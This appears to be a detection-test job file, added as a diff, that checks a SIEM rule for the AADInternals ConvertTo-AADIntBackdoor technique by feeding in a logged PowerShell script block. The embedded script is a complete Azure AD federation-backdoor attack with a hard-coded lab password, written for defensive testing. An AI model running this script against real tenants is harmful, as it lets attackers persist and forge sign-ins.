@@ -1,0 +1,85 @@
+type: job
+name: Windows ConvertTo-AADIntBackdoor Execution Via PowerShell Script
+detection:
+  source: escu
+  name: "ESCU - Windows ConvertTo-AADIntBackdoor Execution Via PowerShell Script - Rule"
+  id: 59a8662f-f616-4494-8fa1-29ae77fc2018
+description: |
+  Validates detection of an AADInternals federation backdoor on an Azure AD
+  domain: PowerShell/Operational EID 4104 (Script Block Logging) records a
+  block that imports the AADInternals module, gets an Azure AD Graph access
+  token with Get-AADIntAccessTokenForAADGraph and calls
+  ConvertTo-AADIntBackdoor with that token for a domain.
+tags: [aadinternals]
+
+mitre:
+  tactics: [initial-access, persistence, privilege-escalation, defense-evasion, credential-access, discovery, command-and-control]
+  techniques: [T1482, T1078, T1212, T1071.001]
+
+state:
+  domain_short:       CORP
+  domain_tld:         local
+  domain_short_lower: fn.lower(ref.domain_short)
+  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+
+workloads:
+  - scenario: scenarios/windows/powershell/script-block/script-block-logged
+    bindings:
+      domain_short:      ref.domain_short
+      domain_tld:        ref.domain_tld
+      computer:          ref.computer
+      provider_guid:     "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
+      script_block_text: "Import-Module AzureAD\n\
+        Import-Module AADInternals\n\
+        \n\
+        $PWord = ConvertTo-SecureString -String \"h@ckAway!!\" -AsPlainText -Force\n\
+        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"snap@snapattack.onmicrosoft.com\", $Pword\n\
+        \n\
+        try {\n\
+        \x20 Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null\n\
+        }\n\
+        catch {\n\
+        \x20 Write-Host \"Error: AzureAD could not connect\"\n\
+        \x20 exit 1\n\
+        }\n\
+        \n\
+        try {\n\
+        \x20 $domain = Get-AzureADDomain -Name \"snaplabs.ddnsfree.com\"\n\
+        }\n\
+        catch {\n\
+        \x20 Write-Host \"Error: domain \"\"snaplabs.ddnsfree.com\"\" not found\"\n\
+        \x20 exit 1\n\
+        }\n\
+        if (-Not $domain.IsVerified) {\n\
+        \x20 Write-Host \"Error: domain \"\"snaplabs.ddnsfree.com\"\" not verified\"\n\
+        \x20 exit 1\n\
+        }\n\
+        \n\
+        if ($domain.AuthenticationType -eq \"Federated\") {\n\
+        \x20 Write-Host \"Error: domain \"\"snaplabs.ddnsfree.com\"\" already federated. Try with a different domain or re-create it before.\"\n\
+        \x20 exit 1\n\
+        }\n\
+        \n\
+        $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\n\
+        if (-Not $at) {\n\
+        \x20 Write-Host \"Error: AADInternals could not connect\"\n\
+        \x20 exit 1\n\
+        }\n\
+        \n\
+        $new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"snaplabs.ddnsfree.com\"\n\
+        if ($new) {\n\
+        \x20 Write-Host \"Federation successfully added to Azure AD\"\n\
+        \x20 Write-Host $new\n\
+        }\n\
+        else {\n\
+        \x20 Write-Host \"The federation setup failed\"\n\
+        }\n\
+        \n\
+        Write-Host \"End of federation configuration.\"\n"
+    expectation:
+      expected: alert
+      summary: "PowerShell runs the AADInternals function ConvertTo-AADIntBackdoor"
+      mitre:
+        tactics: [initial-access, persistence, privilege-escalation, defense-evasion, credential-access, discovery, command-and-control]
+        techniques: [T1482, T1078, T1212, T1071.001]
